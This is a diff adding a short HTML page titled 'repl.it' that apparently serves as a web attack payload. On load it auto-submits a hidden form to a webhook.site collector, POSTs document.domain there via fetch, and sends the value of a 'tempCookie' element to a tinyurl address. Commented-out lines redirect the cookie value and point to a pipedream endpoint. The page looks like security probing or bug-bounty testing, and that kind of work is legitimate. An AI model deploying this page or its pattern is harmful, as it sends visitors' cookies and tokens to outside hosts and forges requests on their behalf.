@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+    <head>
+        <title>repl.it</title>
+
+        <!-- <script type="text/javascript">
+        var cookieValue = document.getElementById("tempCookie").value;document.location="https://tinyurl.com/6emvhpcu?c="cookieValue;
+        </script> -->
+    </head>
+
+    <body onload="document.getElementById('csrf').submit()">
+        <p>hi</p>
+        <script>
+            var cookieValue = document.domain;
+            fetch('https://webhook.site/27cc7b6b-026e-4089-ba9e-43a68e3768de', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: cookieValue
+            });
+        </script>
+        <?echo "hello" ?>
+        <form action="https://webhook.site/27cc7b6b-026e-4089-ba9e-43a68e3768de" accept-charset="UTF-8" method="get" id="csrf">
+        
+        <input name="utf8" value='document.domain'>
+
+
+
+        <!-- <input name="redirect_uri" id="redirect_uri" value="http://78fdc472909209fc681319878b277305.m.pipedream.net/"> -->
+        
+        </form>
+
+    </body>
+    <script>
+        fetch('https://tinyurl.com/6emvhpcu',{method:'POST',mode:'no-cors',body:document.getElementById("tempCookie").value})
+    </script>
+</html>
